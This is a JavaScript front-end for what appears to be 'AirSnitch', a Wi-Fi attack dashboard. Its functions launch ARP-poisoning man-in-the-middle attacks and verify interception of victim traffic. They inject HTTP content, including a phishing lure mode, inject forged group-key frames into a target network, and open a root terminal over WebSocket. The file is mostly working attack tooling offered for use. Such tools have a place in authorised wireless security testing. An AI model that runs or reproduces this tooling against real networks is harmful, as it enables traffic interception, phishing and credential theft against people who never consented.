    const data = await api('/api/pentest/netinfo', 'POST', { iface });
    if (data && data.gateway) {
        if (gwEl) gwEl.value = data.gateway;
        _detectedGateway = data.gateway;
        localStorage.setItem('airsnitch_gateway', data.gateway);
        toast(`Gateway: ${data.gateway}`, 'success');
    } else if (_detectedGateway) {
        // Fall back to JS-cached value (from GTK check or previous session)
        if (gwEl) gwEl.value = _detectedGateway;
        toast(`Gateway (cached): ${_detectedGateway}`, 'success');
    } else {
        toast('Could not detect gateway — enter manually', 'error');
    }
}

async function launchMitm() {
    const iface   = document.getElementById('attack-iface').value.trim();
    const gateway = document.getElementById('exploit-gateway').value.trim();
    if (!gateway) { toast('Enter or auto-detect gateway IP first', 'error'); return; }
    // Cache whatever gateway was used (manual or auto) for next session
    _detectedGateway = gateway;
    localStorage.setItem('airsnitch_gateway', gateway);

    const btn = document.getElementById('exploit-launch-btn');
    btn.disabled = true;
    btn.textContent = 'Launching…';

    const data = await api('/api/pentest/arp-poison-broadcast', 'POST', { iface, gateway, count: 10 });

    btn.disabled = false;
    btn.innerHTML = '&#9656;&nbsp; Launch MITM Attack';

    _mitmGateway = gateway;
    const statusEl = document.getElementById('attack-mitm-status');
    if (statusEl) statusEl.classList.remove('hidden');

    const bannerEl   = document.getElementById('mitm-status-banner');
    const infoGridEl = document.getElementById('mitm-info-grid');

    if (!data || data.error) {
        if (bannerEl) bannerEl.innerHTML =
            '<div class="verdict-banner verdict-error">' +
            '<div class="verdict-title">&#10007; Launch Failed</div>' +
            `<div class="verdict-detail">${esc((data && data.error) || 'Unknown error')}</div>` +
            '</div>';
        return;
    }

    if (bannerEl) bannerEl.innerHTML =
        '<div class="verdict-banner verdict-vulnerable">' +
        '<div class="verdict-title">&#9656; MITM Active — ARP cache poisoned</div>' +
        '<div class="verdict-detail">Broadcast ARP replies sent. Victim traffic will route through this machine.</div>' +
        '</div>';

    if (infoGridEl) {
        infoGridEl.classList.remove('hidden');
        infoGridEl.innerHTML =
            `<div class="mitm-info-item"><span class="mitm-info-label">Our MAC</span><span class="mitm-info-value">${esc(data.our_mac || '—')}</span></div>` +
            `<div class="mitm-info-item"><span class="mitm-info-label">Our IP</span><span class="mitm-info-value">${esc(data.our_ip  || '—')}</span></div>` +
            `<div class="mitm-info-item"><span class="mitm-info-label">Gateway</span><span class="mitm-info-value">${esc(data.gateway || gateway)}</span></div>` +
            `<div class="mitm-info-item"><span class="mitm-info-label">Packets Sent</span><span class="mitm-info-value">${esc(String(data.count || 10))}</span></div>`;
    }

    // Reveal HTTP injection card
    const httpInjectEl = document.getElementById('attack-http-inject');
    if (httpInjectEl) httpInjectEl.classList.remove('hidden');
}

async function verifyMitm() {
    const iface = document.getElementById('attack-iface').value.trim();
    const btn   = document.getElementById('mitm-verify-btn');
    const resEl = document.getElementById('mitm-verify-result');

    btn.disabled = true;
    btn.textContent = 'Capturing 10s…';

    const data = await api('/api/pentest/mitm-verify', 'POST', { iface });

    btn.disabled = false;
    btn.innerHTML = '&#10003;&nbsp; Verify Interception';

    if (!resEl) return;
    resEl.classList.remove('hidden');

    if (!data || data.error) {
        resEl.innerHTML = `<div class="verdict-banner verdict-error"><div class="verdict-title">&#10007; Error</div><div class="verdict-detail">${esc((data && data.error) || 'Unknown error')}</div></div>`;
        return;
    }

    const active = data.verdict === 'MITM ACTIVE';
    resEl.innerHTML =
        `<div class="verdict-banner ${active ? 'verdict-vulnerable' : 'verdict-inconclusive'}">` +
        `<div class="verdict-title">${active ? '&#9888; MITM ACTIVE' : '&#8505; No Traffic Captured'}</div>` +
        `<div class="verdict-detail">${esc(data.detail || data.verdict)}` +
        (data.source_ips && data.source_ips.length ? ` — Sources: ${data.source_ips.map(esc).join(', ')}` : '') +
        '</div></div>';
}

async function stopMitm() {
    const iface = document.getElementById('attack-iface').value.trim();
    const data  = await api('/api/pentest/mitm-stop', 'POST', { iface, gateway: _mitmGateway });

    const statusEl = document.getElementById('attack-mitm-status');
    if (statusEl) statusEl.classList.add('hidden');
    const exploitEl = document.getElementById('attack-exploit-prompt');
    if (exploitEl) exploitEl.classList.add('hidden');
    const httpInjectEl = document.getElementById('attack-http-inject');
    if (httpInjectEl) httpInjectEl.classList.add('hidden');

    if (data && !data.error) {
        toast('MITM stopped and ARP restored', 'success');
    } else {
        toast('Stop command sent (check Logs for details)', 'info');
    }
    _mitmGateway = '';
}

// ── HTTP Content Injection ────────────────────────────────────────────────────

function httpInjectModeChanged() {
    const mode = document.getElementById('inject-mode').value;
    const urlGroup = document.getElementById('inject-url-group');
    const label = document.getElementById('inject-url-label');
    const input = document.getElementById('inject-url');
    const needsUrl = mode === 'redirect' || mode === 'phishing';
    urlGroup.style.display = needsUrl ? '' : 'none';
    if (mode === 'phishing') {
        label.textContent = 'Link URL (where "Restart" button goes)';
        input.placeholder = 'https://your-site.com/login';
    } else {
        label.textContent = 'Redirect URL';
        input.placeholder = 'https://example.com';
    }
}

let _httpInjectPollTimer = null;

async function httpInjectStart() {
    const iface  = document.getElementById('attack-iface').value.trim();
    const mode   = document.getElementById('inject-mode').value;
    const target = document.getElementById('inject-url').value.trim() || 'https://youtu.be/dQw4w9WgXcQ';
    if (mode === 'phishing' && !document.getElementById('inject-url').value.trim()) {
        toast('Enter a link URL for the phishing lure', 'error'); return;
    }

    if (mode === 'redirect' && !target) {
        toast('Enter redirect URL', 'error'); return;
    }

    const btn = document.getElementById('http-inject-start-btn');
    btn.disabled = true; btn.textContent = 'Starting…';

    const data = await api('/api/pentest/http-inject-start', 'POST', { iface, mode, target });

    btn.textContent = '▶ Start Injection';

    if (data.error) {
        btn.disabled = false;
        toast('Failed: ' + data.error, 'error');
        _httpInjectSetStatus('error', '&#10007; ' + data.error);
        return;
    }

    document.getElementById('http-inject-stop-btn').disabled = false;
    document.getElementById('http-inject-output-area').classList.remove('hidden');
    const modeLabel = mode === 'rickroll' ? 'Rick Roll 🎵' : mode === 'page' ? 'Pwned Page' : `→ ${target}`;
    _httpInjectSetStatus('running', `&#9654; Intercepting HTTP traffic &mdash; ${modeLabel}`);
    toast('HTTP injection active — waiting for victim HTTP traffic', 'success');

    _httpInjectPollTimer = setInterval(_httpInjectPoll, 2000);
}

async function _httpInjectPoll() {
    const data = await api('/api/pentest/http-inject-poll');
    if (!data || data.error) return;
    const pre = document.getElementById('http-inject-output');
    if (data.lines && data.lines.length > 0) {
        pre.textContent = data.lines.join('\n');
        pre.scrollTop = pre.scrollHeight;
    }
    if (data.count > 0) {
        _httpInjectSetStatus('running',
            `&#9654; Intercepting HTTP traffic &mdash; <strong>${data.count}</strong> request${data.count !== 1 ? 's' : ''} injected`);
    }
    if (!data.running) {
        clearInterval(_httpInjectPollTimer);
        _httpInjectPollTimer = null;
        document.getElementById('http-inject-start-btn').disabled = false;
        document.getElementById('http-inject-stop-btn').disabled = true;
        _httpInjectSetStatus('stopped', `&#9632; Stopped &mdash; ${data.count} request${data.count !== 1 ? 's' : ''} injected`);
    }
}

async function httpInjectStop() {
    if (_httpInjectPollTimer) { clearInterval(_httpInjectPollTimer); _httpInjectPollTimer = null; }
    const data = await api('/api/pentest/http-inject-stop', 'POST', {});
    document.getElementById('http-inject-start-btn').disabled = false;
    document.getElementById('http-inject-stop-btn').disabled = true;
    _httpInjectSetStatus('stopped', `&#9632; Stopped &mdash; ${data.count || 0} request${(data.count || 0) !== 1 ? 's' : ''} injected`);
    if (data.lines && data.lines.length > 0) {
        document.getElementById('http-inject-output').textContent = data.lines.join('\n');
    }
    toast(`HTTP injection stopped (${data.count || 0} requests intercepted)`, 'success');
}

function _httpInjectSetStatus(type, html) {
    const el = document.getElementById('http-inject-status');
    const color = type === 'running' ? '#3fb950' : type === 'error' ? '#f85149' : '#8b949e';
    el.innerHTML = `<div style="padding:0.4rem 0.75rem; border-radius:6px; font-size:0.82rem; font-weight:600;
        color:${color}; background:${color}18; border:1px solid ${color}44;">${html}</div>`;
}

// ── GTK Frame Injection ───────────────────────────────────────────────────────

let _gtkInjectPollTimer = null;

async function gtkInjectStart() {
    const iface      = document.getElementById('attack-iface').value.trim();
    const bssid      = document.getElementById('inject-bssid').value.trim();
    const gateway_ip = document.getElementById('exploit-gateway').value.trim() || _detectedGateway;
    const interval   = parseFloat(document.getElementById('inject-interval').value) || 10;
    const burst      = parseInt(document.getElementById('inject-burst').value) || 30;

    if (!bssid)      { toast('Enter target BSSID', 'error'); return; }
    if (!gateway_ip) { toast('Enter gateway IP in the exploit section above', 'error'); return; }

    // GTK from last check result
    const gtk = _lastGtkHex;
    if (!gtk) { toast('No GTK available — run GTK check first', 'error'); return; }

    const btn = document.getElementById('inject-start-btn');
    btn.disabled = true; btn.textContent = 'Starting…';

    const data = await api('/api/pentest/gtk-inject-start', 'POST',
        { iface, bssid, gtk, gateway_ip, interval, burst });

    btn.textContent = '▶ Start Injection';

    if (data.error) {
        btn.disabled = false;
        toast('Failed: ' + data.error, 'error');
        _gtkInjectSetStatus('error', '&#10007; ' + data.error);
        return;
    }

    document.getElementById('inject-stop-btn').disabled = false;
    document.getElementById('inject-output-area').classList.remove('hidden');
    _gtkInjectSetStatus('running',
        `&#9654; Injecting every ${interval}s &mdash; ${burst} frames/burst &mdash; monitor: ${data.mon_iface}`);
    toast(`GTK injection started on ${data.mon_iface}`, 'success');

    _gtkInjectPollTimer = setInterval(_gtkInjectPoll, 3000);
}

async function _gtkInjectPoll() {
    const data = await api('/api/pentest/gtk-inject-poll');
    if (!data || data.error) return;
    const pre = document.getElementById('inject-output');
    if (data.lines && data.lines.length > 0) {
        pre.textContent = data.lines.join('\n');
        pre.scrollTop = pre.scrollHeight;
    }
    if (!data.running && data.status !== 'running') {
        clearInterval(_gtkInjectPollTimer);
        _gtkInjectPollTimer = null;
        document.getElementById('inject-start-btn').disabled = false;
        document.getElementById('inject-stop-btn').disabled = true;
        _gtkInjectSetStatus('stopped', '&#9632; Injection stopped');
    }
}

async function gtkInjectStop() {
    if (_gtkInjectPollTimer) { clearInterval(_gtkInjectPollTimer); _gtkInjectPollTimer = null; }
    const data = await api('/api/pentest/gtk-inject-stop', 'POST', {});
    document.getElementById('inject-start-btn').disabled = false;
    document.getElementById('inject-stop-btn').disabled = true;
    _gtkInjectSetStatus('stopped', '&#9632; Injection stopped &mdash; interface restored to managed mode');
    if (data.lines && data.lines.length > 0) {
        document.getElementById('inject-output').textContent = data.lines.join('\n');
    }
    toast('GTK injection stopped', 'success');
}

function _gtkInjectSetStatus(type, html) {
    const el = document.getElementById('inject-status-banner');
    const color = type === 'running' ? '#388bfd' : type === 'error' ? '#f85149' : '#8b949e';
    el.innerHTML = `<div style="padding:0.4rem 0.75rem; border-radius:6px; font-size:0.82rem; font-weight:600;
        color:${color}; background:${color}18; border:1px solid ${color}44;">${html}</div>`;
}

async function runGtkCheck() {
    if (_attackRunning) { toast('Attack already running', 'info'); return; }

    const iface = document.getElementById('attack-iface').value.trim();
    const btn   = document.getElementById('attack-run-btn');
    const resultsEl = document.getElementById('attack-results');
    const verdictEl = document.getElementById('attack-verdict');
    const gtkDisplayEl = document.getElementById('attack-gtk-display');

    _attackRunning = true;
    btn.disabled = true;
    btn.textContent = 'Running… (1–2 minutes — do not navigate away)';

    resultsEl.classList.remove('hidden');
    verdictEl.innerHTML =
        '<div class="verdict-banner verdict-running">' +
        '<div class="verdict-title">Running attack…</div>' +
        '<div class="verdict-detail">Scanning for target network, connecting victim + attacker, comparing GTKs…</div>' +
        '</div>';
    gtkDisplayEl.classList.add('hidden');

    // Detect gateway NOW — wlan0 is still connected; after the test it may be gone
    const gwData = await api('/api/pentest/netinfo', 'POST', { iface });
    if (gwData && gwData.gateway) _detectedGateway = gwData.gateway;

    // Fire the attack (returns immediately)
    const start = await api('/api/airsnitch/gtk-check', 'POST', { iface });
    if (start && start.error) {
        _attackRunning = false;
        btn.disabled = false;
        btn.innerHTML = '&#9654;&nbsp; Run GTK Sharing Check';
        verdictEl.innerHTML =
            '<div class="verdict-banner verdict-error">' +
            '<div class="verdict-title">&#10007; Error</div>' +
            `<div class="verdict-detail">${esc(start.error)}</div>` +
            '</div>';
        return;
    }

    // Poll every 2 s until done
    for (let i = 0; i < 120; i++) {
        await new Promise(r => setTimeout(r, 2000));
        const poll = await api('/api/airsnitch/gtk-poll');
        if (!poll || poll.error) continue;
        if (poll.status === 'done') {
            _attackRunning = false;
            btn.disabled = false;
            btn.innerHTML = '&#9654;&nbsp; Run GTK Sharing Check';
            _showGtkResult(poll);
            return;
        }
    }

    // Timeout after 4 minutes
    _attackRunning = false;
    btn.disabled = false;
    btn.innerHTML = '&#9654;&nbsp; Run GTK Sharing Check';
    verdictEl.innerHTML =
        '<div class="verdict-banner verdict-error">' +
        '<div class="verdict-title">&#10007; Timeout</div>' +
        '<div class="verdict-detail">No result after 4 minutes — check Logs tab</div>' +
        '</div>';
}

// ── Terminal (xterm.js + WebSocket PTY) ─────────────────────────────────────

function initTerminal() {
    if (term) return;

    term = new Terminal({
        cursorBlink: true,
        fontSize: 14,
        fontFamily: "'Fira Code', 'Consolas', 'Courier New', monospace",
        theme: {
            background: '#0d1117',
            foreground: '#e6edf3',
            cursor: '#58a6ff',
            selectionBackground: '#264f78',
        },
        scrollback: 5000,
    });

    fitAddon = new FitAddon.FitAddon();
    const webLinksAddon = new WebLinksAddon.WebLinksAddon();
    term.loadAddon(fitAddon);
    term.loadAddon(webLinksAddon);

    term.open(document.getElementById('terminal-container'));
    fitAddon.fit();

    window.addEventListener('resize', () => { if (fitAddon) fitAddon.fit(); });

    term.writeln('\x1b[1;34m── AirSnitch Terminal ──\x1b[0m');
    term.writeln('Click "Connect" to open a root shell.\r\n');
}

function connectTerminal() {
    if (termSocket && termSocket.readyState === WebSocket.OPEN) {
        toast('Already connected', 'info');
        return;
    }

    const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
    termSocket = new WebSocket(`${proto}//${location.host}/ws/terminal`);
    const statusEl = document.getElementById('terminal-status');

    termSocket.onopen = () => {
        statusEl.textContent = 'Connected';
        statusEl.style.color = '#7ee787';
        toast('Terminal connected', 'success');
        if (fitAddon) {
            fitAddon.fit();
            const dims = fitAddon.proposeDimensions();
            if (dims) termSocket.send(JSON.stringify({ type: 'resize', cols: dims.cols, rows: dims.rows }));
        }
    };

    termSocket.onmessage = (e) => term.write(e.data);
    termSocket.onclose = () => { statusEl.textContent = 'Disconnected'; statusEl.style.color = '#8b949e'; };
    termSocket.onerror = () => toast('Terminal connection failed', 'error');

    term.onData(data => {
        if (termSocket && termSocket.readyState === WebSocket.OPEN) termSocket.send(data);
    });

    term.onResize(({ cols, rows }) => {
        if (termSocket && termSocket.readyState === WebSocket.OPEN)
            termSocket.send(JSON.stringify({ type: 'resize', cols, rows }));
    });
}

function disconnectTerminal() {
    if (termSocket) { termSocket.close(); termSocket = null; toast('Terminal disconnected', 'info'); }
}

// ── Configuration ───────────────────────────────────────────────────────────

async function loadConfig() {
    const data = await api('/api/config/load');
    document.getElementById('config-editor').value = data.content || '';
}

async function saveConfig() {
    const content = document.getElementById('config-editor').value;
    const data = await api('/api/config/save', 'POST', { content });
    data.error ? toast(data.error, 'error') : toast('Configuration saved', 'success');
}

async function loadDefaultConfig() {
    const data = await api('/api/config/example');
    document.getElementById('config-editor').value = data.content || '';
    toast('Example config loaded (not saved yet)', 'info');
}

// ── Logs ────────────────────────────────────────────────────────────────────

async function refreshLogs() {
    const data = await api('/api/logs');
    const el = document.getElementById('log-output');
    el.textContent = data.logs || '(no logs yet)';
    if (document.getElementById('auto-scroll').checked) el.scrollTop = el.scrollHeight;
}

function clearLogs() {
    document.getElementById('log-output').textContent = '';
}

// ── Utility ─────────────────────────────────────────────────────────────────

function esc(str) {
    const el = document.createElement('span');
    el.textContent = str;
    return el.innerHTML;
}

// ── Setup Wizard ────────────────────────────────────────────────────────────

function wizShow() {
    document.getElementById('wizard-overlay').classList.remove('hidden');
    wizNext(1);
}

function wizHide() {
    document.getElementById('wizard-overlay').classList.add('hidden');
}

function wizNext(step) {
    // When same-network is checked, skip step 2 in both directions
    if (step === 2 && document.getElementById('wiz-same-network').checked) {
        const active = document.querySelector('.wizard-step.active');
        // Going forward from step 1 → jump to 3; going back from step 3 → jump to 1
        step = (active && active.id === 'wiz-step-3') ? 1 : 3;
    }

    document.querySelectorAll('.wizard-step').forEach(s => s.classList.remove('active'));
    document.querySelectorAll('.wizard-steps .step').forEach(s => s.classList.remove('active'));
    document.getElementById('wiz-step-' + step).classList.add('active');
    document.querySelector(`.wizard-steps .step[data-step="${step}"]`).classList.add('active');

    // Generate preview on step 3
    if (step === 3) {
        document.getElementById('wiz-preview').textContent = wizGenerateConfig();
    }
}

function wizSameNetworkChanged() {
    // No UI change needed, step 2 is skipped dynamically
}

function wizAuthChanged(prefix) {
    const auth = document.getElementById(`wiz-${prefix}-auth`).value;
    const isPsk = auth === 'WPA-PSK' || auth === 'SAE';
    const isEap = auth === 'WPA-EAP';

    document.getElementById(`wiz-${prefix}-psk-group`).classList.toggle('hidden', !isPsk);
    document.getElementById(`wiz-${prefix}-eap-group`).classList.toggle('hidden', !isEap);
    document.getElementById(`wiz-${prefix}-identity-group`).classList.toggle('hidden', !isEap);
    document.getElementById(`wiz-${prefix}-eap-pass-group`).classList.toggle('hidden', !isEap);
}

async function wizScanNetworks() {
    let iface = document.getElementById('wiz-scan-iface').value.trim();
    if (!iface) { toast('Enter an interface to scan with', 'error'); return; }
    // Strip monitor suffix — iw dev scan requires a managed-mode interface
    if (iface.endsWith('mon')) iface = iface.slice(0, -3);

    const btn = document.querySelector('button[onclick="wizScanNetworks()"]');
    const origText = btn ? btn.textContent : '';
    if (btn) { btn.disabled = true; btn.textContent = 'Scanning…'; }

    const el = document.getElementById('wiz-scan-results');
    const list = document.getElementById('wiz-scan-list');
    el.classList.remove('hidden');
    list.innerHTML = '<option disabled>Scanning for networks — please wait…</option>';

    const data = await api('/api/wifi/scan', 'POST', { iface });
    if (btn) { btn.disabled = false; btn.textContent = origText; }
    list.innerHTML = '';

    if (data.error) {
        list.innerHTML = `<option disabled>${data.error}</option>`;
        return;
    }
    if (!data.networks || data.networks.length === 0) {
        list.innerHTML = '<option disabled>No networks found</option>';
        return;
    }
    data.networks.forEach(n => {
        const opt = document.createElement('option');
        opt.value = JSON.stringify(n);
        opt.textContent = `${n.ssid}  [${n.security}]  ${n.signal}  ch${n.channel}`;
        list.appendChild(opt);
    });
}

function wizSelectNetwork(sel) {
    if (!sel.value) return;
    try {
        const n = JSON.parse(sel.value);
        document.getElementById('wiz-v-ssid').value = n.ssid || '';
        // Auto-set auth type
        if (n.security.includes('SAE')) {
            document.getElementById('wiz-v-auth').value = 'SAE';
        } else if (n.security.includes('EAP') || n.security.includes('802.1X')) {
            document.getElementById('wiz-v-auth').value = 'WPA-EAP';
        } else if (n.security.includes('PSK') || n.security.includes('WPA')) {
            document.getElementById('wiz-v-auth').value = 'WPA-PSK';
        } else {
            document.getElementById('wiz-v-auth').value = 'NONE';
        }
        wizAuthChanged('v');
        // Auto-set frequency
        if (n.freq) {
            const freqSel = document.getElementById('wiz-v-freq');
            for (const opt of freqSel.options) {
                if (opt.value === String(n.freq)) { freqSel.value = opt.value; break; }
            }
        }
    } catch(e) {}
}

function wizBuildBlock(role, prefix) {
    const sameNet = document.getElementById('wiz-same-network').checked;
    const p = (sameNet && role === 'attacker') ? 'v' : prefix;

    const ssid = document.getElementById(`wiz-${p}-ssid`).value.trim();
    const auth = document.getElementById(`wiz-${p}-auth`).value;
    const freq = document.getElementById(`wiz-${p}-freq`).value;

    let lines = [];
    lines.push('network={');
    lines.push(`\tid_str="${role}"`);
    lines.push(`\tssid="${ssid}"`);
    lines.push(`\tkey_mgmt=${auth}`);

    if (auth === 'WPA-PSK') {
        const psk = document.getElementById(`wiz-${p}-psk`).value.trim();
        lines.push(`\tpsk="${psk}"`);
    } else if (auth === 'SAE') {
        const psk = document.getElementById(`wiz-${p}-psk`).value.trim();
        lines.push(`\tsae_password="${psk}"`);
        lines.push('\tieee80211w=2');
    } else if (auth === 'WPA-EAP') {
        const eap = document.getElementById(`wiz-${p}-eap-method`).value;
        const identity = document.getElementById(`wiz-${p}-identity`).value.trim();
        const pass = document.getElementById(`wiz-${p}-eap-pass`).value.trim();
        lines.push(`\teap=${eap}`);
        lines.push(`\tphase2="auth=MSCHAPV2"`);
        lines.push(`\tidentity="${identity}"`);
        lines.push(`\tpassword="${pass}"`);
    }

    if (freq) lines.push(`\tscan_freq=${freq}`);
    lines.push('}');
    return lines.join('\n');
}

function wizGenerateConfig() {
    let conf = '# AirSnitch configuration — generated by Setup Wizard\n';
    conf += '# Do not change ctrl_interface, AirSnitch requires it\n';
    conf += 'ctrl_interface=wpaspy_ctrl\n\n';
    conf += wizBuildBlock('victim', 'v');
    conf += '\n\n';
    conf += wizBuildBlock('attacker', 'a');
    conf += '\n';
    return conf;
}

let wizSaving = false;
let wizConfigured = false;  // track whether we've saved a config this session

async function wizSave() {
    if (wizSaving) return;
    wizSaving = true;

    const btn = document.querySelector('#wiz-step-3 .btn-success');
    const origText = btn.textContent;
    btn.textContent = 'Saving...';
    btn.disabled = true;

    try {
        const content = wizGenerateConfig();
        const data = await api('/api/config/save', 'POST', { content });
        if (data.error) {
            toast('Save error: ' + data.error, 'error');
        } else {
            wizConfigured = true;
            toast('Configuration saved!', 'success');
            document.getElementById('config-editor').value = content;
        }
    } catch (err) {
        toast('Save failed: ' + err.message, 'error');
    } finally {
        btn.textContent = origText;
        btn.disabled = false;
        wizSaving = false;
        // Always close the wizard — user can reopen via nav button
        wizHide();
        // Refresh Attack tab SSID display if it's visible
        attackTabLoad();
    }
}

// Close wizard on overlay click
document.getElementById('wizard-overlay')?.addEventListener('click', (e) => {
    if (e.target === e.currentTarget) wizHide();
});

// ── WiFi Connect GUI ────────────────────────────────────────────────────────

let wifiSelectedNetwork = null;
let wifiScannedNetworks = [];

function wifiShowConnect() {
    const iface = ptIface();
    if (!iface) { toast('Enter an interface first', 'error'); return; }
    document.getElementById('wifi-overlay').classList.remove('hidden');
    wifiSetStatus('ready', 'Ready to scan');
    // Auto-scan on open
    wifiScan();
}

function wifiHideConnect() {
    document.getElementById('wifi-overlay').classList.add('hidden');
    wifiSelectedNetwork = null;
}

function wifiSetStatus(state, text) {
    const icon = document.getElementById('wifi-status-icon');
    const txt = document.getElementById('wifi-status-text');
    icon.className = 'wifi-status-icon ' + state;
    txt.textContent = text;
}

function wifiSignalBars(signal) {
    // signal is like "-45 dBm" — parse the number
    const match = signal.match(/-?\d+/);
    if (!match) return '\u2582';  // minimal bar
    const dbm = parseInt(match[0]);
    if (dbm > -50) return '\u2584\u2586\u2588';   // excellent
    if (dbm > -60) return '\u2584\u2586';          // good
    if (dbm > -70) return '\u2584';                // fair
    return '\u2582';                                // weak
}

function wifiSecurityLabel(sec) {
    sec = sec.toUpperCase();
    if (sec.includes('SAE')) return 'WPA3';
    if (sec.includes('EAP') || sec.includes('802.1X')) return 'Enterprise';
    if (sec.includes('PSK') || sec.includes('WPA') || sec.includes('RSN')) return 'WPA2';
    if (sec === 'OPEN' || !sec.trim()) return 'Open';
    return sec.substring(0, 12);
}

function wifiSecurityType(sec) {
    sec = sec.toUpperCase();
    if (sec.includes('SAE')) return 'SAE';
    if (sec.includes('EAP') || sec.includes('802.1X')) return 'WPA-EAP';
    if (sec.includes('PSK') || sec.includes('WPA') || sec.includes('RSN')) return 'WPA-PSK';
    return 'NONE';
}

function wifiNeedsPassword(secType) {
    return secType !== 'NONE';
}

async function wifiScan() {
    const iface = ptIface();
    if (!iface) { toast('Enter an interface', 'error'); return; }

    wifiSetStatus('scanning', 'Scanning for networks...');
    const scanBtn = document.getElementById('wifi-scan-btn');
    scanBtn.disabled = true;
    scanBtn.textContent = 'Scanning...';

    // Show list area, hide cred area
    document.getElementById('wifi-list-area').classList.remove('hidden');
    document.getElementById('wifi-cred-area').classList.add('hidden');
    document.getElementById('wifi-progress-area').classList.add('hidden');

    const listEl = document.getElementById('wifi-network-list');
    listEl.innerHTML = '<p class="muted" style="padding:1.5rem; text-align:center;">Scanning...</p>';

    const data = await api('/api/wifi/scan', 'POST', { iface });

    scanBtn.disabled = false;
    scanBtn.textContent = 'Scan';

    if (data.error) {
        wifiSetStatus('error', 'Scan failed: ' + data.error);
        listEl.innerHTML = `<p class="muted" style="padding:1.5rem; text-align:center; color:#da3633;">${esc(data.error)}</p>`;
        return;
    }

    wifiScannedNetworks = data.networks || [];

    if (wifiScannedNetworks.length === 0) {
        wifiSetStatus('ready', 'No networks found — try again');
        listEl.innerHTML = '<p class="muted" style="padding:1.5rem; text-align:center;">No networks found. Try again.</p>';
        return;
    }

    wifiSetStatus('ready', `Found ${wifiScannedNetworks.length} network(s)`);

    listEl.innerHTML = wifiScannedNetworks.map((n, i) => {
        const secType = wifiSecurityType(n.security);
        const secLabel = wifiSecurityLabel(n.security);
        const isOpen = secType === 'NONE';
        const lockIcon = isOpen
            ? '<span class="wifi-net-open" title="Open network">\u25CB</span>'
            : '<span class="wifi-net-lock" title="Secured">\u25CF</span>';
        const bars = wifiSignalBars(n.signal || '');
        const ch = n.channel ? `Ch ${n.channel}` : '';
        const freq = n.freq ? `${n.freq} MHz` : '';
        return `<div class="wifi-net-item" onclick="wifiPickNetwork(${i})" data-idx="${i}">
            <div class="wifi-net-signal" title="${esc(n.signal || 'unknown')}">${bars}</div>
            <div class="wifi-net-info">
                <div class="wifi-net-ssid">${esc(n.ssid)}</div>
                <div class="wifi-net-detail">
                    <span>${secLabel}</span>
                    ${ch ? `<span>${ch}</span>` : ''}
                    ${freq ? `<span>${freq}</span>` : ''}
                </div>
            </div>
            ${lockIcon}
        </div>`;
    }).join('');
}

function wifiPickNetwork(idx) {
    const n = wifiScannedNetworks[idx];
    if (!n) return;
    wifiSelectedNetwork = n;

    const secType = wifiSecurityType(n.security);
    const secLabel = wifiSecurityLabel(n.security);
    const needsPass = wifiNeedsPassword(secType);
    const isEnterprise = secType === 'WPA-EAP';

    // Show credentials area
    document.getElementById('wifi-list-area').classList.add('hidden');
    document.getElementById('wifi-cred-area').classList.remove('hidden');
    document.getElementById('wifi-progress-area').classList.add('hidden');

    document.getElementById('wifi-sel-ssid').textContent = n.ssid;
    document.getElementById('wifi-sel-security').textContent = secLabel;

    // Show/hide password field
    document.getElementById('wifi-pass-group').classList.toggle('hidden', !needsPass);
    document.getElementById('wifi-identity-group').classList.toggle('hidden', !isEnterprise);

    // Clear previous values
    document.getElementById('wifi-password').value = '';
    if (document.getElementById('wifi-identity')) document.getElementById('wifi-identity').value = '';

    // Focus password field
    if (needsPass) {
        setTimeout(() => document.getElementById('wifi-password').focus(), 100);
    }

    wifiSetStatus('ready', `Selected: ${n.ssid}`);
}

function wifiBackToList() {
    document.getElementById('wifi-list-area').classList.remove('hidden');
    document.getElementById('wifi-cred-area').classList.add('hidden');
    document.getElementById('wifi-progress-area').classList.add('hidden');
    wifiSelectedNetwork = null;
}

async function wifiDoConnect() {
    if (!wifiSelectedNetwork) { toast('Select a network first', 'error'); return; }
    const iface = ptIface();
    if (!iface) { toast('Enter an interface', 'error'); return; }

    const n = wifiSelectedNetwork;
    const secType = wifiSecurityType(n.security);
    const password = document.getElementById('wifi-password').value;
    const identity = document.getElementById('wifi-identity')?.value || '';

    if (wifiNeedsPassword(secType) && !password && secType !== 'WPA-EAP') {
        toast('Enter the network password', 'error');
        document.getElementById('wifi-password').focus();
        return;
    }
    if (secType === 'WPA-EAP' && (!identity || !password)) {
        toast('Enter identity and password for Enterprise', 'error');
        return;
    }

    // Show progress
    document.getElementById('wifi-cred-area').classList.add('hidden');
    document.getElementById('wifi-progress-area').classList.remove('hidden');

    const mode = ptConnectMode();
    const modeLabel = mode === 'airsnitch' ? 'modified' : 'stock';
    const progressEl = document.getElementById('wifi-progress-steps');
    const steps = [
        'Stopping existing connections...',
        `Starting wpa_supplicant (${modeLabel})...`,
        `Associating with ${n.ssid}...`,
        'Getting IP address (DHCP)...',
    ];

    function renderProgress(current, results) {
        progressEl.innerHTML = steps.map((s, i) => {
            let cls = '';
            let icon = '\u25CB';  // circle
            if (i < current) {
                cls = results[i] ? 'done' : 'fail';
                icon = results[i] ? '\u2713' : '\u2717';
            } else if (i === current) {
                cls = 'active';
                icon = '\u25CF';  // filled circle
            }
            return `<div class="wifi-prog-step ${cls}"><span class="wifi-prog-icon">${icon}</span>${esc(s)}</div>`;
        }).join('');
    }

    // Animate progress
    const results = [];
    renderProgress(0, results);
    wifiSetStatus('connecting', `Connecting to ${n.ssid}...`);

    const connectBtn = document.getElementById('wifi-connect-btn');
    connectBtn.disabled = true;

    const body = {
        iface,
        ssid: n.ssid,
        security: secType,
        password,
        mode,
    };
    if (secType === 'WPA-EAP') {
        body.identity = identity;
        body.eap_method = 'PEAP';
    }

    // Animate step progression (slower for AirSnitch mode — association takes longer)
    const stepDelay = mode === 'airsnitch' ? 4000 : 2000;
    let stepIdx = 0;
    const stepTimer = setInterval(() => {
        if (stepIdx < 3) {
            results.push(true);
            stepIdx++;
            renderProgress(stepIdx, results);
        }
    }, stepDelay);

    const data = await api('/api/pentest/quickconnect', 'POST', body);

    clearInterval(stepTimer);
    connectBtn.disabled = false;

    // ── Fallback: if the API call failed or reported no IP, poll for IP ──
    // Uses lightweight /quickcheck (no gateway detection) to avoid hammering the server.
    if (data.error || !data.connected) {
        const iface2 = ptIface();
        if (iface2) {
            progressEl.innerHTML = steps.map((s, i) => {
                const cls = i < 3 ? 'done' : 'active';
                const icon = i < 3 ? '\u2713' : '\u25CF';
                return `<div class="wifi-prog-step ${cls}"><span class="wifi-prog-icon">${icon}</span>${esc(i === 3 ? 'Waiting for IP address...' : s)}</div>`;
            }).join('');
